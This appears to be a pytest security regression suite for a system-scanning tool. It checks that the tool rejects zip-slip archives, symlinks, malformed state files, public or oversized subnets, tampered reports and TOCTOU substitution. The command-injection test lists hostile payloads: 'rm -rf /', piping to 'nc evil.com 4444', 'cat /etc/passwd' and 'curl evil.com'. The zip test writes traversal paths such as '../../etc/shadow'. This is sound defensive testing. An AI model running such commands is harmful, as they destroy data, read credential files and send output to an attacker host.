"""Comprehensive Security Regression and Hardening Test Suite (Phase 11).

Validates defenses against:
- Path traversal & zip-slip attacks
- Symlink escapes & target substitution
- Malicious & malformed JSON states
- Archive & decompression bombs
- Command injection & unsafe subprocess arguments
- Unauthorized network discovery & invalid CIDR bounds
- Unicode & special character path resilience
- Concurrent update locks & race conditions
- Report overwriting & tampering
- TOCTOU cleanup target substitution
- Malware false-positive resistance (high entropy synthetic files, unknown hashes)
"""

from __future__ import annotations

import os
import zipfile
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from systemscan.config.manager import ConfigManager
from systemscan.core.dependencies import SafeDependencyInstaller
from systemscan.core.exceptions import ConfigMalformedError
from systemscan.engine.checkpoint import ScanCheckpointManager
from systemscan.engine.history import ScanHistoryManager
from systemscan.engine.models import ScanState, ScanType
from systemscan.modules.malware.engine import MalwareDetectionEngine
from systemscan.modules.malware.models import ThreatConfidence, ThreatSeverity
from systemscan.modules.malware.quarantine.manager import QuarantineManager
from systemscan.modules.storage.cleanup.executor import SafeCleanupExecutor
from systemscan.modules.storage.cleanup.safety import CleanupSafetyValidator
from systemscan.modules.storage.models import (
    CleanupCandidate,
    CleanupPreview,
    CleanupSafetyCategory,
    StorageCategory,
)
from systemscan.network.discovery import LocalNetworkDiscovery
from systemscan.reporting.exporter import ReportExporter
from systemscan.reporting.models import (
    ConfidenceSummary,
    ExecutiveSummary,
    OverallScanResult,
    ReportFormat,
    ReportMetadata,
    ScanReport,
    ScanStatistics,
    SeveritySummary,
    SystemSummary,
)
from systemscan.update.history import UpdateHistoryManager
from systemscan.update.transaction import UpdateLockError, UpdateTransactionCoordinator
from systemscan.update.verifier import UpdateVerifier
from systemscan.utils.paths import AppPaths


def _create_minimal_report(session_id: str) -> ScanReport:
    """Helper creating a minimal valid ScanReport for tests."""
    now = datetime.now(timezone.utc)
    return ScanReport(
        metadata=ReportMetadata(
            report_id=f"rep-{session_id}",
            scan_id=session_id,
            scan_type=ScanType.FULL,
            scan_status=ScanState.COMPLETED,
            generated_at=now,
        ),
        system_info=SystemSummary(
            hostname="test-host",
            os_family="Windows",
            os_name="Windows 11",
            os_version="11",
            cpu_model="Test CPU",
            total_ram_bytes=16000000000,
        ),
        statistics=ScanStatistics(
            scan_type=ScanType.FULL,
            duration_seconds=10.0,
            items_discovered=100,
            items_processed=100,
            bytes_processed=1048576,
        ),
        executive_summary=ExecutiveSummary(
            scan_id=session_id,
            scan_type=ScanType.FULL,
            scan_status=ScanState.COMPLETED,
            system_identifier="test-host",
            os_description="Windows 11",
            start_time=now,
            completion_time=now,
            duration_seconds=10.0,
            items_analyzed=100,
            data_processed_bytes=1048576,
            items_skipped=0,
            errors_count=0,
            severity_summary=SeveritySummary(),
            confidence_summary=ConfidenceSummary(),
            overall_result=OverallScanResult.NO_HIGH_PRIORITY_FINDINGS,
        ),
    )


# 1. Path Traversal & Zip-Slip Defense
def test_zip_slip_and_path_traversal_hardening(tmp_path: Path) -> None:
    slip_zip = tmp_path / "slip_attack.zip"
    with zipfile.ZipFile(slip_zip, "w") as zf:
        zf.writestr("../../../../../etc/shadow", "root:*:0:0:...")
        zf.writestr("..\\..\\Windows\\System32\\calc.exe", "fake")
        zf.writestr("C:\\Windows\\System32\\evil.dll", "fake")

    verifier = UpdateVerifier()
    safe, msg = verifier.verify_archive_safety(slip_zip)
    assert safe is False
    assert "Path traversal detected" in msg or "Prohibited drive letter" in msg

    # Extraction must refuse to extract
    extract_dir = tmp_path / "extract_dest"
    ex_ok, ex_msg = verifier.extract_safe(slip_zip, extract_dir)
    assert ex_ok is False
    assert not (extract_dir / "etc").exists()


# 2. Symlink Escape & Quarantine Rejection
def test_symlink_safety_and_quarantine_rejection(tmp_path: Path) -> None:
    real_file = tmp_path / "legit_file.txt"
    real_file.write_text("sensitivedata", encoding="utf-8")

    link_file = tmp_path / "symlink_pointer"
    try:
        link_file.symlink_to(real_file)
        has_symlink = True
    except (OSError, NotImplementedError):
        has_symlink = False

    if has_symlink:
        # Cleanup safety validator must reject symlinks
        safety, reason = CleanupSafetyValidator.evaluate_safety(link_file)
        assert safety == CleanupSafetyCategory.PROTECTED
        assert "Symbolic link rejected" in reason

        # Quarantine manager must refuse to quarantine symlinks
        qm = QuarantineManager(quarantine_dir=tmp_path / "quarantine")
        with pytest.raises(ValueError, match="Refusing to quarantine symlink"):
            qm.quarantine_file(link_file, expected_sha256="0" * 64)


# 3. Malformed JSON & Corrupted State Resilience
def test_corrupted_state_recovery_resilience(tmp_path: Path) -> None:
    # A. Corrupted config
    app_paths = AppPaths(base_dir=tmp_path)
    cfg_file = app_paths.config_file
    cfg_file.parent.mkdir(parents=True, exist_ok=True)
    cfg_file.write_text("{{INVALID_JSON:::###", encoding="utf-8")
    cfg_mgr = ConfigManager(app_paths=app_paths)
    with pytest.raises(ConfigMalformedError):
        cfg_mgr.load()

    # B. Corrupted scan history
    hist_file = tmp_path / "corrupted_history.json"
    hist_file.write_text("[{'incomplete': True, ", encoding="utf-8")
    hist_mgr = ScanHistoryManager(history_file=hist_file)
    assert hist_mgr.list_sessions() == []

    # C. Corrupted update history
    upd_hist_file = tmp_path / "corrupted_upd_history.json"
    upd_hist_file.write_text("NOT_JSON", encoding="utf-8")
    upd_hist_mgr = UpdateHistoryManager(history_file=upd_hist_file)
    assert upd_hist_mgr.list_transactions() == []

    # D. Corrupted checkpoint
    ckpt_dir = tmp_path / "checkpoints"
    ckpt_dir.mkdir()
    (ckpt_dir / "bad_session.ckpt").write_text("corrupted_binary_data", encoding="utf-8")
    ckpt_mgr = ScanCheckpointManager(checkpoint_dir=ckpt_dir)
    res = ckpt_mgr.load_checkpoint("bad_session")
    assert res is None


# 4. Oversized Input & Resource Boundary Defenses
def test_network_cidr_bounds_and_ssrf_mitigation() -> None:
    discovery = LocalNetworkDiscovery()

    # Reject invalid subnet formats
    with pytest.raises(ValueError, match="Invalid IPv4 subnet format"):
        discovery.validate_subnet_authorization("999.999.999.999/24")

    # Reject public Internet ranges by default (SSRF / unauthorized port probe defense)
    with pytest.raises(PermissionError, match="Scanning public IP network"):
        discovery.validate_subnet_authorization("8.8.8.0/24", allow_public=False)

    # Reject massive subnets (/16 has 65,536 hosts -> resource exhaustion defense)
    with pytest.raises(ValueError, match="exceeds safe discovery limit"):
        discovery.validate_subnet_authorization("192.168.0.0/16", allow_public=False)

    # Valid local /24 subnet is accepted
    net = discovery.validate_subnet_authorization("192.168.1.0/24")
    assert net.num_addresses == 256


# 5. Command Injection Prevention in Subprocess Execution
def test_subprocess_command_injection_hardening() -> None:
    injection_payloads = [
        "pyyaml; rm -rf /",
        "pyyaml && whoami",
        "pyyaml | nc evil.com 4444",
        "pyyaml`cat /etc/passwd`",
        "pyyaml$(id)",
        "pyyaml\ncurl evil.com",
    ]
    for payload in injection_payloads:
        ok, msg = SafeDependencyInstaller.install_package(payload, allow_global=True)
        assert ok is False
        assert "Rejected unsafe package specification" in msg


# 6. Unicode & Special Character Path Resilience
def test_unicode_and_special_character_paths(tmp_path: Path) -> None:
    unicode_dir = tmp_path / "тест_üñîçødë_📁_漢字"
    unicode_dir.mkdir()
    sample_file = unicode_dir / "dátá_파일.txt"
    sample_file.write_text("unicode content verification", encoding="utf-8")

    assert sample_file.exists()
    safety, reason = CleanupSafetyValidator.evaluate_safety(sample_file)
    assert safety == CleanupSafetyCategory.PROTECTED  # .txt is protected document format


# 7. Concurrent Update Lock Protection
def test_concurrent_update_lock_collision(tmp_path: Path) -> None:
    coordinator = UpdateTransactionCoordinator()
    coordinator.lock_file = tmp_path / "update.lock"

    # Simulate existing lock acquired by active process
    coordinator.acquire_lock("txn-alpha")
    assert coordinator.lock_file.exists()

    # Second coordinator attempting concurrent update must be blocked
    coord2 = UpdateTransactionCoordinator()
    coord2.lock_file = tmp_path / "update.lock"
    with pytest.raises(UpdateLockError, match="is currently in progress"):
        coord2.acquire_lock("txn-beta")

    # Release lock
    coordinator.release_lock()
    assert not coordinator.lock_file.exists()


# 8. Report Overwrite & Tamper Verification
def test_report_overwrite_and_integrity_protection(tmp_path: Path) -> None:
    from systemscan.reporting.storage import ReportStorageManager

    report = _create_minimal_report("sec-audit-01")
    storage_mgr = ReportStorageManager(storage_dir=tmp_path / "reports")
    exporter = ReportExporter(storage_manager=storage_mgr)

    # Initial export
    exported_path = exporter.export(report, fmt=ReportFormat.JSON, overwrite=False)
    manifest_path = exported_path.with_suffix(exported_path.suffix + ".sha256")
    assert exported_path.exists()
    assert manifest_path.exists()

    # Attempting to export again without overwrite must be rejected
    with pytest.raises(FileExistsError, match="already exists"):
        exporter.export(report, fmt=ReportFormat.JSON, overwrite=False)

    # Validating intact manifest
    ok, msg = storage_mgr.verify_report(report.metadata.report_id)
    assert ok is True

    # Tampering with report content must be caught by manifest verification
    with open(exported_path, "a", encoding="utf-8") as f:
        f.write("\n// Tampered payload")

    tampered_ok, tampered_msg = storage_mgr.verify_report(report.metadata.report_id)
    assert tampered_ok is False
    assert "MISMATCH" in tampered_msg


# 9. Cleanup TOCTOU & Target Substitution Protection
def test_cleanup_toctou_target_substitution(tmp_path: Path) -> None:
    target_file = tmp_path / "temp_cache.log"
    target_file.write_text("disposable cache data", encoding="utf-8")

    st = target_file.stat()
    cand = CleanupCandidate(
        candidate_id="cand-01",
        path=str(target_file),
        size_bytes=st.st_size,
        modified_at=datetime.fromtimestamp(st.st_mtime - 10, tz=timezone.utc),  # Changed mtime
        category=StorageCategory.TEMPORARY_FILES,
        safety=CleanupSafetyCategory.SAFE_CANDIDATE,
        reason="Test temporary log",
        can_delete=True,
    )
    preview = CleanupPreview(
        preview_id="prev-01",
        candidates=[cand],
        total_candidates=1,
        total_reclaimable_bytes=st.st_size,
        category_breakdown={},
        protected_paths_count=0,
    )

    executor = SafeCleanupExecutor(audit_logger=MagicMock())
    # Since modified_at deviates by > 2s from cand.modified_at, executor must skip file
    audit = executor.execute_cleanup(preview, authorized=True, dry_run=False)
    assert audit.deleted_files_count == 0
    assert audit.skipped_files_count == 1
    assert target_file.exists()  # Target file was preserved against TOCTOU mutation


# 10. Malware Detection Accuracy: High Entropy Synthetic Files & Unknown Hashes
def test_malware_accuracy_synthetic_high_entropy_non_malicious(tmp_path: Path) -> None:
    engine = MalwareDetectionEngine()

    # Generate synthetic high-entropy compressed random byte payload
    random_bytes = os.urandom(8192)
    sample_file = tmp_path / "high_entropy_data.bin"
    sample_file.write_bytes(random_bytes)

    findings = engine.analyze_file(sample_file, scan_id="sec-audit-01")

    # High entropy alone must NOT produce CONFIRMED CRITICAL threat findings
    for finding in findings:
        assert not (
            finding.severity == ThreatSeverity.CRITICAL
            and finding.confidence == ThreatConfidence.CONFIRMED
        )
